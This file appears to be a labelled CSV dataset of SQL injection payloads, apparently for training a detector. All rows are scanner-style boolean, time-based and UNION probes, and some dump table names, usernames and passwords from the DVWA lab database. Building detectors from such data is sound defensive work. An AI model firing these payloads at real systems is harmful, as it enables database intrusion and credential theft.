input_text,Label
"1"") AND 7656=5892 AND (""yQqQ"" LIKE ""yQqQ",1
"1"") AND 1947=1947 AND (""GoeT"" LIKE ""GoeT",1
"1"")) AND 2623=8546 AND ((""Scqe"" LIKE ""Scqe",1
"1"")) AND 1947=1947 AND ((""GJHN"" LIKE ""GJHN",1
"1""))) AND 2065=2693 AND (((""WCpe"" LIKE ""WCpe",1
"1""))) AND 1947=1947 AND (((""LIRD"" LIKE ""LIRD",1
"1"" AND 7910=3352 AND ""yalb"" LIKE ""yalb",1
"1"" AND 1947=1947 AND ""UeEI"" LIKE ""UeEI",1
1 AND 4802=1575-- HJXM,1
1 AND 1947=1947-- iLVi,1
1 AND 2990=5024# LjWM,1
1 AND 1947=1947# teYO,1
1' AND 2179=3424 OR 'PQQd'='nTZC,1
1' AND 1947=1947 OR 'uvZh'='plbp,1
1' AND 6160=5237 OR 'VFFB'='PFzk,1
1') WHERE 7620=7620 AND 3092=6701-- imlg,1
1') WHERE 2926=2926 AND 1947=1947-- VlUX,1
"1"") WHERE 9269=9269 AND 6982=8750-- Rmej",1
"1"") WHERE 4205=4205 AND 1947=1947-- Uidc",1
1) WHERE 4465=4465 AND 5757=6626-- wrkp,1
1) WHERE 4611=4611 AND 1947=1947-- teIX,1
1' WHERE 5472=5472 AND 3543=1480-- dgWH,1
1' WHERE 5923=5923 AND 1947=1947-- YOKL,1
"1"" WHERE 5839=5839 AND 5096=8712-- lUBN",1
"1"" WHERE 7668=7668 AND 1947=1947-- OyTS",1
1 WHERE 5269=5269 AND 4046=2002-- EJnE,1
1 WHERE 7095=7095 AND 1947=1947-- paoD,1
1'||(SELECT 0x636a5148 WHERE 6960=6960 AND 7414=3128)||',1
1'||(SELECT 0x55427761 WHERE 3487=3487 AND 1947=1947)||',1
1'||(SELECT 0x54667255 FROM DUAL WHERE 2342=2342 AND 3229=5539)||',1
1'||(SELECT 0x4169526c FROM DUAL WHERE 4993=4993 AND 1947=1947)||',1
1'+(SELECT 0x716c7159 WHERE 8714=8714 AND 3829=1574)+',1
1'+(SELECT 0x74525a48 WHERE 5363=5363 AND 1947=1947)+',1
1||(SELECT 0x614c6676 FROM DUAL WHERE 6898=6898 AND 6486=6635)||,1
1||(SELECT 0x4e6b4d76 FROM DUAL WHERE 2619=2619 AND 1947=1947)||,1
1||(SELECT 0x48455742 WHERE 9731=9731 AND 3209=6071)||,1
1||(SELECT 0x6646577a WHERE 2623=2623 AND 1947=1947)||,1
1+(SELECT nhFc WHERE 3163=3163 AND 4263=3396)+,1
1+(SELECT RNFP WHERE 4041=4041 AND 1947=1947)+,1
1+(SELECT 0x726d6c77 WHERE 5445=5445 AND 7283=6887)+,1
1+(SELECT 0x6c494848 WHERE 9084=9084 AND 1947=1947)+,1
1')) AS qArU WHERE 7650=7650 AND 3152=6342-- zFAS,1
1')) AS DOTa WHERE 7137=7137 AND 1947=1947-- xlqO,1
"1"")) AS jAdx WHERE 9540=9540 AND 5924=9850-- oMaQ",1
"1"")) AS LMHo WHERE 9959=9959 AND 1947=1947-- VzwB",1
1)) AS CSkI WHERE 6225=6225 AND 3119=4366-- iegi,1
1)) AS hnak WHERE 9546=9546 AND 1947=1947-- odfe,1
1') AS SbTO WHERE 4541=4541 AND 3466=9675-- Whsa,1
1') AS mCPl WHERE 2858=2858 AND 1947=1947-- mdne,1
"1"") AS rPjB WHERE 7515=7515 AND 3156=1335-- RFmy",1
"1"") AS iwhx WHERE 9790=9790 AND 1947=1947-- NCQD",1
1) AS XRLr WHERE 5162=5162 AND 9599=7789-- EATW,1
1) AS YwqW WHERE 8535=8535 AND 1947=1947-- KOCp,1
1` WHERE 2907=2907 AND 3207=5746-- ddWg,1
1` WHERE 3678=3678 AND 1947=1947-- CkTg,1
1`) WHERE 9892=9892 AND 8772=5601-- ezwe,1
1`) WHERE 3636=3636 AND 1947=1947-- eUZb,1
1`=`1` AND 4414=9446 AND `1`=`1,1
1`=`1` AND 1947=1947 AND `1`=`1,1
"1""=""1"" AND 4061=1230 AND ""1""=""1",1
"1""=""1"" AND 1947=1947 AND ""1""=""1",1
1]-(SELECT 0 WHERE 7566=7566 AND 7408=4410)|[1,1
1]-(SELECT 0 WHERE 8051=8051 AND 1947=1947)|[1,1
1' IN BOOLEAN MODE) AND 4349=3541#,1
1' IN BOOLEAN MODE) AND 1947=1947#,1
-5484,1
-3946) OR 3302=3877-- LSiS,1
-6378) OR 7464=7464-- GsUG,1
-5145') OR 4138=2617-- QusF,1
-3095') OR 7464=7464-- ZDfc,1
-1008' OR 4498=8234-- YNwy,1
-8283' OR 7464=7464-- iweI,1
-6865' OR 1234=5427-- NMpu,1
-3260' iVXfDqhCzN-- MHbA,1
"-3244"" OR 4024=5309-- vviw",1
"-4060"" OR 7464=7464-- IJkT",1
-3938) OR 4108=1435 AND (1123=1123,1
-6459) OR 7464=7464 AND (1621=1621,1
-8955)) OR 9997=1129 AND ((7450=7450,1
-7290)) OR 7464=7464 AND ((8231=8231,1
-1031))) OR 4751=2015 AND (((7064=7064,1
-4280))) OR 7464=7464 AND (((8426=8426,1
-1810 OR 2392=3975,1
-1258 OR 7464=7464,1
-9468') OR 3325=4787 AND ('XxzT'='XxzT,1
-8024') OR 7464=7464 AND ('sHYl'='sHYl,1
-2057')) OR 6541=4504 AND (('QzUo'='QzUo,1
-9067')) OR 7464=7464 AND (('IIvh'='IIvh,1
-4494'))) OR 6049=9576 AND ((('hrNJ'='hrNJ,1
-4958'))) OR 7464=7464 AND ((('hBou'='hBou,1
-8512' OR 3922=4045 AND 'NIMn'='NIMn,1
-5058' OR 7464=7464 AND 'QqIS'='QqIS,1
-8327' OR 7826=6318 AND 'qGfg'='qGfg,1
-7296' iVXfDqhCzN AND 'TlJj'='TlJj,1
-1163') OR 8879=3695 AND ('kTjL' LIKE 'kTjL,1
-1070') OR 7464=7464 AND ('ULBJ' LIKE 'ULBJ,1
-4600')) OR 8870=3758 AND (('orUB' LIKE 'orUB,1
-7743')) OR 7464=7464 AND (('VUtL' LIKE 'VUtL,1
-5675'))) OR 3295=3610 AND ((('aboI' LIKE 'aboI,1
-3939'))) OR 7464=7464 AND ((('GExr' LIKE 'GExr,1
-1116%' OR 3074=8691 AND 'fceS%'='fceS,1
-9260%' OR 7464=7464 AND 'nNPS%'='nNPS,1
-6376' OR 5237=8119 AND 'VHPc' LIKE 'VHPc,1
-7316' OR 7464=7464 AND 'tKKz' LIKE 'tKKz,1
-5503' OR 2561=1874 AND 'ISKs' LIKE 'ISKs,1
-6664' iVXfDqhCzN AND 'aMhC' LIKE 'aMhC,1
"-2935"") OR 2342=7709 AND (""MEqL""=""MEqL",1
"-1330"") OR 7464=7464 AND (""uiMh""=""uiMh",1
"-5514"")) OR 6006=7541 AND ((""Ecsy""=""Ecsy",1
"-9188"")) OR 7464=7464 AND ((""oHUH""=""oHUH",1
"-8954""))) OR 6760=2186 AND (((""QAfI""=""QAfI",1
"-7170""))) OR 7464=7464 AND (((""laNS""=""laNS",1
"-8085"" OR 5563=7728 AND ""pPdx""=""pPdx",1
"-3971"" OR 7464=7464 AND ""GlEv""=""GlEv",1
"-1161"") OR 9999=5791 AND (""SrbB"" LIKE ""SrbB",1
"-8329"") OR 7464=7464 AND (""UUcj"" LIKE ""UUcj",1
"-6871"")) OR 2645=2056 AND ((""aNdp"" LIKE ""aNdp",1
"-2041"")) OR 7464=7464 AND ((""dFPn"" LIKE ""dFPn",1
"-2420""))) OR 4131=1077 AND (((""hxEn"" LIKE ""hxEn",1
"-6740""))) OR 7464=7464 AND (((""sjEe"" LIKE ""sjEe",1
"-3265"" OR 9017=1378 AND ""HPCJ"" LIKE ""HPCJ",1
"-4270"" OR 7464=7464 AND ""BxJG"" LIKE ""BxJG",1
-6373 OR 9892=6974-- HefT,1
-6920 OR 7464=7464-- mHyj,1
-1565 OR 4121=1701# PuNx,1
-9423 OR 7464=7464# cPCD,1
-4169' OR 4834=9319 OR 'FZUZ'='iwoP,1
-8833' OR 7464=7464 OR 'vrbr'='zcXG,1
-7781' OR 8406=9503 OR 'BdUl'='ArDy,1
-4080' iVXfDqhCzN OR 'ZKLp'='ArMY,1
-9084') WHERE 7750=7750 OR 8496=7381-- cpCw,1
-1168') WHERE 2685=2685 OR 7464=7464-- zEVx,1
"-2090"") WHERE 6917=6917 OR 4308=4393-- GORo",1
"-5898"") WHERE 4561=4561 OR 7464=7464-- QNCZ",1
-7796) WHERE 6279=6279 OR 5178=4574-- aIwW,1
-1999) WHERE 3346=3346 OR 7464=7464-- WJzG,1
-8540' WHERE 7851=7851 OR 5702=3936-- BtlQ,1
-8456' WHERE 1663=1663 OR 7464=7464-- Idcu,1
"-7689"" WHERE 8105=8105 OR 1812=1183-- XcPA",1
"-8840"" WHERE 1283=1283 OR 7464=7464-- AUMR",1
-9660 WHERE 2843=2843 OR 4700=9039-- ROuM,1
-8966 WHERE 1219=1219 OR 7464=7464-- yFrd,1
-3015')) AS xxCT WHERE 7775=7775 OR 2792=7282-- rUrg,1
-7294')) AS LTrY WHERE 2681=2681 OR 7464=7464-- Cylf,1
"-3603"")) AS hfvh WHERE 7078=7078 OR 8577=2080-- cTot",1
"-8267"")) AS Eolg WHERE 2114=2114 OR 7464=7464-- Rrvr",1
-7270)) AS GJoH WHERE 1192=1192 OR 6652=3962-- QJYD,1
-1757)) AS ybKn WHERE 2089=2089 OR 7464=7464-- uDsD,1
-3722') AS pFGm WHERE 2753=2753 OR 7022=7135-- WNJV,1
-3370') AS INDn WHERE 5346=5346 OR 7464=7464-- GSfG,1
"-2980"") AS TIhi WHERE 8137=8137 OR 9637=8896-- nNel",1
"-4751"") AS sgrY WHERE 5169=5169 OR 7464=7464-- dwXC",1
-9933) AS ZYzi WHERE 5878=5878 OR 4723=5408-- qcnh,1
-3049) AS hwSp WHERE 7894=7894 OR 7464=7464-- Gziu,1
1) OR NOT 7169=9015-- dbHF,1
1) OR NOT 1648=1648-- jSgT,1
1') OR NOT 9002=7011-- pFMK,1
1') OR NOT 1648=1648-- BdJa,1
1' OR NOT 5048=4677-- ragY,1
1' OR NOT 1648=1648-- hCmz,1
1' OR NOT 2153=2483-- JAMX,1
"(SELECT CONCAT(CONCAT(0x7176766b71,(CASE WHEN (8479=8479) THEN 0x31 ELSE 0x30 END)),0x7162786a71))",1
"1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176766b71,(SELECT (ELT(7624=7624,1))),0x7162786a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- vEjo",1
"(SELECT CONCAT(0x7176766b71,(ELT(8592=8592,1)),0x7162786a71))",1
1';SELECT SLEEP(5)#,1
1';SELECT SLEEP(5)-- aFNV,1
1';(SELECT * FROM (SELECT(SLEEP(5)))exnX)#,1
1';(SELECT * FROM (SELECT(SLEEP(5)))iXCb)-- ajDp,1
"1';SELECT BENCHMARK(5000000,MD5(0x6a70415a))#",1
"1';SELECT BENCHMARK(5000000,MD5(0x6e53714c))-- vBIk",1
1' AND (SELECT 9351 FROM (SELECT(SLEEP(5)))QcjH)-- pnNM,1
1' AND (SELECT 9351 FROM (SELECT(SLEEP(0)))QcjH)-- pnNM,1
1' AND (SELECT 9351 FROM (SELECT(SLEEP(5)))QcjH)-- pnNM,1
1' ORDER BY 1-- -,1
1' ORDER BY 3233-- -,1
1' ORDER BY 10-- -,1
1' ORDER BY 6-- -,1
1' ORDER BY 4-- -,1
1' ORDER BY 3-- -,1
1' ORDER BY 2-- -,1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71) UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x586d415048766167517467786d7444597263506b6d504b74417746694a496f4b6872446d42527779,0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,0x56464a64667162564a47514e514579684f7749456a644b6c65495a5049584d4d704b4d686f4d566f,0x7162786a71) FROM (SELECT 0 AS iiyV UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS DQpt-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (4990=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4990) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x7162786a71)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,table_name)),0x7162786a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(table_name AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,column_name,column_type)),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(column_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(column_type AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x7162786a71) FROM dvwa.users-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(`user` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(avatar AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(failed_login AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(first_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(last_login AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(last_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(password AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(user_id AS CHAR),0x20),0x7162786a71) FROM dvwa.users-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,column_name,column_type)),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(column_name AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(column_type AS CHAR),0x20),0x7162786a71) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,JSON_ARRAYAGG(CONCAT_WS(0x676c796b6f6b,`comment`,`name`,comment_id)),0x7162786a71) FROM dvwa.guestbook-- -",1
"1' UNION ALL SELECT NULL,CONCAT(0x7176766b71,IFNULL(CAST(`comment` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(`name` AS CHAR),0x20),0x676c796b6f6b,IFNULL(CAST(comment_id AS CHAR),0x20),0x7162786a71) FROM dvwa.guestbook-- -",1
"3'("")(,.)(.",1
"3'mlZrxY<'"">SGmdWr",1
3) AND 9170=3277-- rSTX,1
3) AND 1679=1679-- UqZw,1
3') AND 4768=1152-- ptuC,1
3') AND 1679=1679-- UEUc,1
3' AND 4170=2773-- iUfa,1
3' AND 1679=1679-- Jmnp,1
"3"" AND 2389=1482-- eLdg",1
"3"" AND 1679=1679-- grCS",1
3) AND 5661=2362 AND (9573=9573,1
3) AND 1679=1679 AND (2545=2545,1
3)) AND 8697=4070 AND ((6741=6741,1
3)) AND 1679=1679 AND ((8077=8077,1
3))) AND 3993=5061 AND (((7341=7341,1
3))) AND 1679=1679 AND (((7151=7151,1
3 AND 4409=3181,1
3 AND 1679=1679,1
3 AND 4113=9896,1
3') AND 2369=9391 AND ('ClvK'='ClvK,1
3') AND 1679=1679 AND ('UhdV'='UhdV,1
3')) AND 9479=2913 AND (('vIPS'='vIPS,1
3')) AND 1679=1679 AND (('cwpW'='cwpW,1
3'))) AND 7686=5210 AND ((('iOjj'='iOjj,1
3'))) AND 1679=1679 AND ((('ARfh'='ARfh,1
3' AND 2174=4072 AND 'fJxK'='fJxK,1
3' AND 1679=1679 AND 'ilDQ'='ilDQ,1
3') AND 1879=4348 AND ('LCFv' LIKE 'LCFv,1
3') AND 1679=1679 AND ('vwhE' LIKE 'vwhE,1
3')) AND 1406=3730 AND (('zLvV' LIKE 'zLvV,1
3')) AND 1679=1679 AND (('sZfP' LIKE 'sZfP,1
3'))) AND 1552=8625 AND ((('NXPc' LIKE 'NXPc,1
3'))) AND 1679=1679 AND ((('eUdv' LIKE 'eUdv,1
3%' AND 6444=5833 AND 'yEUg%'='yEUg,1
3%' AND 1679=1679 AND 'Pczx%'='Pczx,1
3' AND 9585=3172 AND 'MOZr' LIKE 'MOZr,1
3' AND 1679=1679 AND 'GZoE' LIKE 'GZoE,1
"3"") AND 3448=9940 AND (""tPMz""=""tPMz",1
"3"") AND 1679=1679 AND (""tnED""=""tnED",1
"3"")) AND 3048=1945 AND ((""eNMZ""=""eNMZ",1
"3"")) AND 1679=1679 AND ((""vDEU""=""vDEU",1
"3""))) AND 2702=1806 AND (((""dLXo""=""dLXo",1
"3""))) AND 1679=1679 AND (((""DtEe""=""DtEe",1
"3"" AND 2853=8188 AND ""JqmW""=""JqmW",1
"3"" AND 1679=1679 AND ""cVAz""=""cVAz",1
"3"") AND 6968=4884 AND (""vCrK"" LIKE ""vCrK",1
"3"") AND 1679=1679 AND (""XhVt"" LIKE ""XhVt",1
"3"")) AND 5918=5702 AND ((""aEuC"" LIKE ""aEuC",1
"3"")) AND 1679=1679 AND ((""LTkl"" LIKE ""LTkl",1
"3""))) AND 5418=5730 AND (((""hJNa"" LIKE ""hJNa",1
"3""))) AND 1679=1679 AND (((""fAFz"" LIKE ""fAFz",1
"3"" AND 4727=4142 AND ""bpUw"" LIKE ""bpUw",1
"3"" AND 1679=1679 AND ""DYHe"" LIKE ""DYHe",1
3 AND 3507=2582-- iUGg,1
3 AND 1679=1679-- Iysz,1
3 AND 8620=1572-- kEcD,1
3 AND 9764=6546# MeyL,1
3 AND 1679=1679# jfAv,1
3 AND 4441=6893# vVwt,1
3' AND 9597=5971 OR 'sTKo'='apqM,1
3' AND 1679=1679 OR 'nrFG'='vZQH,1
3') WHERE 9020=9020 AND 8690=2411-- rAFb,1
3') WHERE 7118=7118 AND 1679=1679-- cfHf,1
"3"") WHERE 7782=7782 AND 2263=4939-- sgkY",1
"3"") WHERE 8879=8879 AND 1679=1679-- WsyC",1
3) WHERE 3281=3281 AND 1721=5799-- FTNf,1
3) WHERE 4089=4089 AND 1679=1679-- uUNF,1
3' WHERE 3642=3642 AND 7768=7574-- exbW,1
3' WHERE 6168=6168 AND 1679=1679-- uQYI,1
"3"" WHERE 5427=5427 AND 8559=6296-- ZJCK",1
"3"" WHERE 4935=4935 AND 1679=1679-- oGLm",1
3 WHERE 7001=7001 AND 6673=1393-- VoWG,1
3 WHERE 6415=6415 AND 1679=1679-- ccwB,1
3'||(SELECT 0x49614a54 WHERE 2049=2049 AND 1251=4054)||',1
3'||(SELECT 0x65536b47 WHERE 1418=1418 AND 1679=1679)||',1
3'||(SELECT 0x4e576956 FROM DUAL WHERE 6373=6373 AND 6930=5660)||',1
3'||(SELECT 0x794f714d FROM DUAL WHERE 2313=2313 AND 1679=1679)||',1
3'+(SELECT 0x7a7a6a52 WHERE 2567=2567 AND 9755=2506)+',1
3'+(SELECT 0x564e4349 WHERE 5428=5428 AND 1679=1679)+',1
3||(SELECT 0x61565666 FROM DUAL WHERE 2385=2385 AND 7699=6117)||,1
3||(SELECT 0x54474356 FROM DUAL WHERE 8171=8171 AND 1679=1679)||,1
3||(SELECT 0x66634b76 WHERE 1537=1537 AND 2458=5204)||,1
3||(SELECT 0x724a6b75 WHERE 8287=8287 AND 1679=1679)||,1
3+(SELECT hvTA WHERE 3617=3617 AND 2362=3270)+,1
3+(SELECT CayR WHERE 1192=1192 AND 1679=1679)+,1
3+(SELECT 0x504a4a68 WHERE 6929=6929 AND 8710=8766)+,1
3+(SELECT 0x486d6c61 WHERE 9146=9146 AND 1679=1679)+,1
3')) AS zoCL WHERE 6700=6700 AND 8854=1634-- VmmH,1
3')) AS ALhD WHERE 8593=8593 AND 1679=1679-- kBIS,1
"3"")) AS vjCQ WHERE 8969=8969 AND 6039=3979-- qbSz",1
"3"")) AS nkhV WHERE 9858=9858 AND 1679=1679-- SLML",1
3)) AS dCfl WHERE 5674=5674 AND 7776=9581-- bGEI,1
3)) AS nPrF WHERE 6064=6064 AND 1679=1679-- aEfO,1
3') AS nBbS WHERE 2640=2640 AND 9359=2269-- fohF,1
3') AS fGya WHERE 4205=4205 AND 1679=1679-- SSzj,1
"3"") AS WHzs WHERE 3087=3087 AND 1946=4389-- wVIy",1
"3"") AS QxDG WHERE 8971=8971 AND 1679=1679-- NkdQ",1
3) AS uvRp WHERE 3366=3366 AND 7599=9629-- HfUl,1
3) AS tcXM WHERE 5162=5162 AND 1679=1679-- SuPQ,1
3` WHERE 3750=3750 AND 6426=2792-- MNLa,1
3` WHERE 3415=3415 AND 1679=1679-- nELV,1
3`) WHERE 1017=1017 AND 3215=6668-- DFXb,1
3`) WHERE 6710=6710 AND 1679=1679-- Ubtg,1
3`=`3` AND 4744=1745 AND `3`=`3,1
3`=`3` AND 1679=1679 AND `3`=`3,1
"3""=""3"" AND 8682=7799 AND ""3""=""3",1
"3""=""3"" AND 1679=1679 AND ""3""=""3",1
3]-(SELECT 0 WHERE 2519=2519 AND 2224=4800)|[3,1
3]-(SELECT 0 WHERE 6201=6201 AND 1679=1679)|[3,1
3' IN BOOLEAN MODE) AND 7996=3741#,1
3' IN BOOLEAN MODE) AND 1679=1679#,1
-1901,1
-4690) OR 3707=6708-- jjOd,1
-1321) OR 3355=3355-- goAG,1
-7099') OR 9793=3875-- YIbo,1
-3430') OR 3355=3355-- uzwf,1
-1110' OR 2770=4671-- JuBV,1
-5697' OR 3355=3355-- vCaR,1
"-1205"" OR 7704=4224-- GkLN",1
"-6948"" OR 3355=3355-- wMYN",1
-6681) OR 6325=6876 AND (1883=1883,1
-9725) OR 3355=3355 AND (5279=5279,1
-6212)) OR 4521=6232 AND ((1611=1611,1
-9531)) OR 3355=3355 AND ((4676=4676,1
-8231))) OR 7893=4854 AND (((2813=2813,1
-8144))) OR 3355=3355 AND (((6947=6947,1
-2156 OR 2576=4334,1
-2594 OR 3355=3355,1
-8395 OR 4667=6951,1
-4041 PxzRcTMAoc,1
-3448') OR 3067=8591 AND ('ffax'='ffax,1
-9858') OR 3355=3355 AND ('ebLk'='ebLk,1
-7596')) OR 1936=7086 AND (('yWox'='yWox,1
-3851')) OR 3355=3355 AND (('bklS'='bklS,1
-2284'))) OR 4962=9493 AND ((('QDJo'='QDJo,1
-1158'))) OR 3355=3355 AND ((('sUFk'='sUFk,1
-5134' OR 5829=3963 AND 'JPTe'='JPTe,1
-3611' OR 3355=3355 AND 'LIJh'='LIJh,1
-7235') OR 3606=1135 AND ('ijfE' LIKE 'ijfE,1
-2636') OR 3355=3355 AND ('qFnM' LIKE 'qFnM,1
-1189')) OR 7043=3754 AND (('uyRk' LIKE 'uyRk,1
-1879')) OR 3355=3355 AND (('SAGd' LIKE 'SAGd,1
